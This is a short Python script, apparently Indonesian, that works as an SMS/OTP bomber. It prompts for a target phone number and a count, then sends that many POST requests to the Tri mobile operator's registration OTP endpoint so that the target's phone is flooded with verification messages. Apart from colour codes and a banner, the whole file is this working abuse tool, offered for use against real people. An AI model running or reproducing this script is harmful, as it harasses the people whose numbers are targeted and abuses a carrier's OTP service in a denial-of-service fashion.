import requests, os, time, sys
from abinkuns import logo
url = 'https://registrasi.tri.co.id/daftar/generateOTP'
g = "\033[32;1m" 
gt = "\033[0;32m" 
bt = "\033[34;1m" 
b = "\033[36;1m" 
m = "\033[31;1m" 
c = "\033[0m" 
p = "\033[37;1m" 
u = "\033[35;1m" 
zes = "\033[3;1m" 
k = "\033[33;1m"
kt = "\033[0;33m" 
a = "\033[30;1m" 
aqu = "\x1b[0m" 
mens = "\x1b[31m" 
men = "\x1b[1;32m" 
kuli = "\x1b[33m" 
sma = "\x1b[34m" 
smp = "\x1b[35m" 
sd = "\x1b[36m" 
z = "\x1b[37m"
os.system('clear')
def ketik(s):
	for c in s +'\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(2.0/90)
logo.banner()
def spam():
	g = input(f'{mens}<{kuli}BENJAMIN ID{mens}> {sma}MASUKAN NO TARGET:')
	zx = int(input(f'{mens}[{kuli}!{mens}] {sd}JUMLAH:'))
	agent = {'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36'}
	data = {'msisdn': g}
	for x in range(zx):
		abi = requests.post(url, data=data)
		if '200' in abi.text:
			print(f'{sd}[{kuli}!{sd}].{mens}{g} {gt}SUKSES')
		else:
			print(f'{sd}[{kuli}!{sd}].{mens}{g} {gt}GAGAL')
spam()			
